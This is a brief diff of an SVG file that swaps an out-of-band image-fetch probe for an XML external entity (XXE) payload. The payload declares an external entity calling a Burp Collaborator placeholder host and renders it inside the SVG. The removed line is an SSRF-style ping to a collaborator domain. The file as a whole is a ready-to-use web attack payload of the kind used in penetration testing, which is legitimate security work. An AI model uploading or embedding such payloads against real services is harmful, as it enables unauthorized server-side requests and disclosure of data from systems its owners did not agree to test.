@@ -1,3 +1,7 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
-  <image href="http://dubqft0dozolnhcwq9fr8nnxvo1fp4.burpcollaborator.net/ping.png" height="100" width="100"/>
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "http://YOUR_ID.burpcollaborator.net/xxe">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+  <text x="10" y="20">&xxe;</text>
 </svg>
